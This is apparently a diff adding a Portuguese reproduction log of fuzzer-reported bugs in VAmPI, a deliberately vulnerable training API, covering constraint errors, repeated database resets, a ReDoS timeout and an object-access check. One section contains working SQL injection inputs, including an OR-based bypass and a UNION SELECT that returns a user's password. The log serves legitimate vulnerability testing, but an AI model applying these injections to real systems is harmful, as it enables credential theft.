@@ -1,0 +1,62 @@
+# Reprodução manual (VAmPI limpo, 2026-11-24T19:17:41-03:00), casos que dependem de estado
+
+## 1) POST /books/v1 com título que já pertence a OUTRO usuário (relatos 3bb5b01b73e9, 5180ebae611a)
+{ "message": "Database populated." }
+$ GET /books/v1
+{
+  "Books": [
+    {
+      "book_title": "bookTitle72",
+      "user": "name1"
+    },
+    {
+      "book_title": "bookTitle12",
+      "user": "name2"
+    },
+    {
+      "book_title": "bookTitle90",
+      "user": "admin"
+    }
+  ]
+}
+
+título escolhido (dono != name1): bookTitle12
+$ POST /books/v1 (como name1) {"book_title":"bookTitle12","secret":"x"}
+HTTP 500
+<title>sqlalchemy.exc.IntegrityError: (sqlite3.IntegrityError) UNIQUE constraint failed: books.book_title
+
+$ POST /books/v1 (como name1) com título do próprio name1: bookTitle72
+{ "status": "fail", "message": "Book Already exists!"} HTTP 400
+
+## 2) GET /createdb repetido 30 vezes (relatos c4ff37a6cddc, 80c49ed6967f, eb2b0e1c4ce2)
+200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 
+
+## 3) GET /users/v1/{username} com aspa simples (SQLi, VAMPI-01)
+$ GET /users/v1/name1'
+<title>sqlalchemy.exc.OperationalError: (sqlite3.OperationalError) unrecognized token: "'name1''"
+HTTP 500
+$ GET /users/v1/name1'%20OR%20'1'='1
+{"username": "name1", "email": "mail1@mail.com"} HTTP 200
+$ GET /users/v1/x'%20UNION%20SELECT%20username,password,email,admin,id%20FROM%20users--
+{"username": "pass1", "email": "1"} HTTP 200
+
+## 4) GET /books/v1/{book_title} de livro de outro usuário (ST108 e2ef582a61ec; VAMPI-03)
+{ "status": "fail", "message": "Book not found!"} HTTP 404
+
+## 5) PUT /users/v1/{username}/email com e-mail longo (RESTler timeout e7f456148913; VAMPI-07 ReDoS)
+HTTP 000 em 30.029312s
+      4 api-1  | Traceback (most recent call last):
+      1 api-1  | sqlite3.OperationalError: unrecognized token: "'name1''"
+      1 api-1  | sqlite3.IntegrityError: UNIQUE constraint failed: books.book_title
+      1 api-1  | sqlalchemy.exc.OperationalError: (sqlite3.OperationalError) unrecognized token: "'name1''"
+      1 api-1  | sqlalchemy.exc.IntegrityError: (sqlite3.IntegrityError) UNIQUE constraint failed: books.book_title
+
+## 2b) GET /createdb repetido 300 vezes (2026-11-24T19:19:01-03:00)
+    292 200
+      8 500
+      8 api-1  | sqlalchemy.exc.IntegrityError: (sqlite3.IntegrityError) UNIQUE constraint failed: books.book_title
+
+## d270be035ef1 (RESTler InvalidValueChecker 500, operação 'desconhecida') — 2026-11-24T20:02:48-03:00
+$ GET /users/v1/Su'SPdJNGZ+5FSs7kGq$ (via curl; o cliente de socket do reprodutor esperou 30 s sem resposta)
+<title>sqlalchemy.exc.OperationalError: (sqlite3.OperationalError) near "SPdJNGZ": syntax error
+  -> HTTP 500
